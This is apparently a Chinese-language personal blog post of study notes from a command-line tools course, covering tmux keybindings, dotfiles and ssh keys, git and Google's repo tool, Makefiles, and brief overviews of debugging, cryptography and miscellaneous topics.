<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   列出所有session vim快捷键下的选择</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; 第n个窗口,n是个数字</span><br><span class="line">prefix w   列出window 和 session(s ?),  jk 选择，enter进入</span><br><span class="line">prefix ,   重命名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       关闭pune</span><br><span class="line">prefix %       竖直切割</span><br><span class="line">prefix <span class="string">&quot;       水平切割</span></span><br><span class="line"><span class="string">prefix 方向键   选择 pune</span></span><br><span class="line"><span class="string">prefix x       关闭pune</span></span><br><span class="line"><span class="string">prefix z       最大化当前窗口，在按一次退出</span></span><br><span class="line"><span class="string">prefix !       分离pune 进入window</span></span><br><span class="line"><span class="string">持续按prefix 方向键  改变pune大小</span></span><br></pre></td></tr></table></figure>

<p>配置快捷键， <code>~/.tmux.conf</code>。我使用的是基于网上找的 <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl-b 距离非常有点阴间，因此需要改。ctrl-a 是qemu快捷键。因此选择ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + 方向键，pune 移动</span><br></pre></td></tr></table></figure>

<ul>
<li>插件管理 <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></li>
<li>美化+快捷键 系列操作参考。<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></li>
</ul>
<h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><p>给常用的命令设置别名 </p>
<ul>
<li>bash 的<code>~/.bashrc</code> 文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意，不要存在 ll = &#x27;ls -l&#x27; 因为在shell script中，空格是有意义的</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><p>各种配置文件。大部分是文件</p>
<ul>
<li>bash -&gt; <code>~/.bashrc</code></li>
<li>zsh -&gt; <code>~/.zshrc</code>。我们的zsh美化也是修改此文件。</li>
<li>vim -&gt; <code>~/.vimrc</code></li>
<li>tmux -&gt; <code>~/tmux.conf</code></li>
<li>neovim -&gt; <code>~/.config/nvim</code> 目录下的 <code>基于lua</code> 配置</li>
<li>ssh -&gt; <code>~/.ssh</code> 这是一个目录。可以配置公私钥，免密登录。<ul>
<li>自己的机器 <code>ssh-keygen</code> 命令生成公私钥</li>
<li>将公钥放入服务器的 <code>authorized_keys</code>。权限一般是<code>600</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的ssh 传输文件 scp  和cp命令差不多，给出路径</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure>

<p>感兴趣的可以学习一下 <a href="https://nixos.org/">NixOS</a>, 一个基于配置文件的操作系统😋</p>
<p>大部分配置都可在 github 查找到，如果不想自己配置，直接 <code>clone/fork</code> 一个其他人的。</p>
<p>bash 前面的一串的修改 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   我们shell 前面的一串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>问题：如何在本机和服务器同时使用tmux</p>
</blockquote>
<p>相同的配置会可能产生冲突，或者会使我们不知道操作的是哪一个，因此我们需要不同的配置文件。最简单的就是使用两个 <code>prefix</code> 。</p>
<h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote>
<p>git版本控制</p>
</blockquote>
<p>开发项目，团队合作，文件损坏的回退。。。git都可以在很大程度上帮助我们，不需要删除在重新下载😘</p>
<ul>
<li>git 抽象建模。使用有向无环图进行抽象<ul>
<li>顶层root，文件夹抽象为<code>tree</code>, 文件抽象为<code>blob</code></li>
<li>commit: 每次commit 产生一个类似 <code>snapshot(快照)</code>的东西，保存当前的状态以及一些信息(作者，描述…)。</li>
<li>通过 <code>mapping&lt;string, object&gt;</code> 进行管理.string指文件的哈希值(SHA-1)，object是我们文件保存的地址(‘snapshot’在磁盘中的地址)。每次修改，commit会产生新的hash</li>
</ul>
</li>
<li>reference: git需要的是文件的哈希值，对于人类毫无意义，因此存在另一个 <code>mapping&lt;string, string&gt;</code> 。我们使用可以人类方便阅读的字符串，映射到hash，然后在寻找到文件</li>
<li>git 几个状态，可以看看 <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Git工作流和核心原理</a>，非常有趣。在学习时，可以想象一下有向无环图进行理解。<ul>
<li>工作区</li>
<li>暂存区</li>
<li>本地仓库</li>
<li>远程仓库</li>
</ul>
</li>
</ul>
<p>git 的配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置用户名，邮箱。自己的账户。</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure>

<p>创建一个git仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># 本地仓库初始化，出现一个 `.git` 的目录</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># 查看仓库状态，非常常用</span></span><br></pre></td></tr></table></figure>

<p>日志，查看提交的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># oneline 去除一定的信息</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure>

<p>其中存在一个 <code>HEAD</code> 指针指向当前工作的分支。</p>
<p>我们想忽略某些文件时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 gitignore 文件配置</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># 忽略所有的 jpg文件</span></span><br></pre></td></tr></table></figure>
<p>本地操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># 写点新文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># 处于untracked 状态，使用git status 会存在提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存区</span></span><br><span class="line">git add readme.txt       <span class="comment"># 处于tracked 状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交到本地仓库</span></span><br><span class="line">git commit  <span class="comment"># 进入文件，进行描述修改的内容</span></span><br><span class="line">	-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message 代表描述，简短描述可以这样使用</span></span><br></pre></td></tr></table></figure>


<p>提交到远程代码仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 远程创建后直接clone下来，然后再写内容</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># 查看和那些仓库有联系</span></span><br><span class="line">git push        <span class="comment"># 有.git文件夹，可以找到仓库提交</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 我们在本地写了很多文件，但是中途想起来没有使用git，我们如何做？</span></span><br><span class="line"><span class="comment">## 还是需要先创建仓库</span></span><br><span class="line"><span class="comment">## 然后再本地</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># 关联远程仓库。</span></span><br><span class="line">							<span class="comment"># name 自己取，可以关联很多仓库，根据名字区分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 但是本地仓库一般是master，某些平台是main(也可以选，但是默认是main)，这一步可能出错，需要切换分支 `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 远程分支不存在会创建一个</span></span><br><span class="line">git push <span class="string">&quot;仓库名称&quot;</span> <span class="string">&quot;本地分支名&quot;</span>:<span class="string">&quot;远程分支名&quot;</span>   <span class="comment"># 如果本地分支名与远程分支名相同，则可以省略冒号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 删除远程仓库</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;仓库名&quot;</span></span><br></pre></td></tr></table></figure>


<p>从远程仓库到工作区。比如团队合作中，远程仓库更新了，我们需要先同步。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接同步到本地，会直接更新本地文件</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于pull 一步到位，也可分步进行</span></span><br><span class="line"><span class="comment">## 先更新到到本地仓库</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff 对比区别</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># 查看本地仓库和工作区的区别</span></span><br><span class="line"><span class="comment">## pull 合并 = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>


<p>分支操作。我们参与开源项目时，建议创建一个新分支push，由项目负责人决定是否合并(merge)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># 创建一个分支 </span></span><br><span class="line">		-vv   <span class="comment"># 查看分支信息</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># 切换分支</span></span><br><span class="line">		-d <span class="string">&quot;name&quot;</span>    <span class="comment"># 删除分支</span></span><br><span class="line">		-D <span class="string">&quot;name&quot;</span>    <span class="comment"># 暴力删除</span></span><br><span class="line">		-b <span class="string">&quot;name&quot;</span>    <span class="comment"># 创建一个分支然后切换</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># 将别的分支合并到 `当前分支` 中</span></span><br><span class="line">		<span class="comment"># 可能会存在冲突，在某一个相同的位置存在不同的内容.保存的话，自己决定然后修改冲突文件就行</span></span><br></pre></td></tr></table></figure>


<p>git clone 会复制远程的所有文件，包含其所有的 <code>snapshot</code> 我们可以使用 <code>--shallow</code> 忽略这些</p>
<p>git 回滚：当我们在一个分支中<code>commit</code>后发现一个巨大的错误，需要回退到之前的版本。改变 <code>HEAD</code> 指针</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash   <span class="comment"># 回退到上一个commit 版本</span></span><br><span class="line">git bisect  <span class="comment"># 比较强大的工具</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">		--hard         <span class="comment"># 会丢失最新的代码修改</span></span><br><span class="line">		--soft         <span class="comment"># 将 HEAD 指针回退到指定提交，不改变暂存区和工作区的内容</span></span><br><span class="line">		</span><br><span class="line">			HEAD^       <span class="comment"># 上一个 版本</span></span><br><span class="line">			HEAD~&lt;num&gt;  <span class="comment"># 回退num个版本</span></span><br><span class="line">			&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># 回退到指定哈希值的版本</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># 将版本复制一份，不会销毁</span></span><br></pre></td></tr></table></figure>


<p>现在的IDE中存在git相关的工具，也更加方便了我们的使用。</p>
<p>也存在其余的版本控制工具，svn, repo……</p>
<h3 id="repo-使用"><a href="#repo-使用" class="headerlink" title="repo 使用"></a>repo 使用</h3><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> 更适合多个仓库的管理，平常我们见的项目都是一个仓库。但是向Android这样的依赖上百个git仓库来说，依靠git并不是多么好使用，因此google 开发了repo工具，本质是一个python脚本，基于git。</p>
<p>初始化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init</span><br><span class="line">	-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># 默认为google的仓库 https://gerrit.googlesource.com/git-repo</span></span><br><span class="line">								<span class="comment"># 这个目录下最简单只需要 default.xml</span></span><br><span class="line">	-b  <span class="comment"># 指定branch</span></span><br></pre></td></tr></table></figure>

<p> -u后的仓库, xml文件(默认<code>default.xml</code>, 我们可以自己选择)，然后我们拉取的时候会将所有的git仓库拉取下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">	-m 指定xml文件</span><br></pre></td></tr></table></figure>

<p>拉取代码到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure>

<p>分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo branch  <span class="comment"># 查看分支</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># 创建分支并进入</span></span><br></pre></td></tr></table></figure>

<h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote>
<p>调试程序以及性能分析</p>
</blockquote>
<p>查看日志，打印日志，制作日志</p>
<p>调试器</p>
<ul>
<li>GNU gdb，可以调试几乎所有的二进制程序</li>
<li>python pdb，python调试</li>
<li>浏览器调试js</li>
</ul>
<p>性能测试</p>
<ul>
<li>测试一个程序运行 time</li>
</ul>
<h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><p>如何更高的管理项目、测试、依赖管理。使用 <code>makefile</code></p>
<p>Makefile 的使用比较简单。</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">目标: 依赖</span></span><br><span class="line">	命令  //前面必须是tab键</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">	gcc main.c -o mian</span><br></pre></td></tr></table></figure>

<p>一些语法</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$^</span>   所有的依赖项</span><br><span class="line"><span class="variable">$&lt;</span>   一个依赖项</span><br><span class="line"><span class="variable">$@</span>   目标文件</span><br><span class="line">echo 打印</span><br><span class="line">%    通配符</span><br><span class="line">*    也是通配符</span><br></pre></td></tr></table></figure>

<p>我们编译某些开源项目时也会使用 <code>make</code> 命令，可以看看别人怎么写的。</p>
<p>当然，还有其他的选择，比如 <code>cmake</code></p>
<h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote>
<p>安全很多，也是一门专门的学科，想要深入就需要学专业课</p>
</blockquote>
<p>hash: 用作信息摘要，签名，检查文件的完整性。</p>
<ul>
<li>md5</li>
<li>sha-1&#x2F;2&#x2F;3</li>
</ul>
<p>对称加密</p>
<ul>
<li>DES</li>
<li>AES</li>
</ul>
<p>非对称加密</p>
<ul>
<li>RSA</li>
<li>ECC</li>
</ul>
<p>数字签名</p>
<h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote>
<p>大杂烩：讲述一些概念，熟练还得在以后多练习</p>
</blockquote>
<p>键盘映射</p>
<ul>
<li>键盘上的<code>Caps Lock</code>几乎不怎么使用，我们可以重新配置一下(比如比较小的Esc)，让其发挥作用</li>
<li>windows可以使用powertoy</li>
</ul>
<p>守护进程，daemon</p>
<p>命令行参数</p>
<ul>
<li>我们使用的命令可以带有参数</li>
</ul>
<p>Window Manage</p>
<p>VPN</p>
<p>Jupyter Notebook: 交互式编程</p>
<p>GitHub: 代码托管平台</p>
<ul>
<li>创建自己的仓库</li>
<li>提issue，解决问题</li>
<li>pr: pull request，自己写的提交给作者</li>
<li>merge 别人的请求</li>
</ul>
<h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote>
<p>来自学生的问题</p>
</blockquote>
<p>如何进行操作系统的学习？</p>
<ul>
<li>learn by exercise: 学习比较出名的 OS 课程，完成相应的lab，实现自己的OS</li>
</ul>
<p>…… 自己看</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>vim</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
</search>
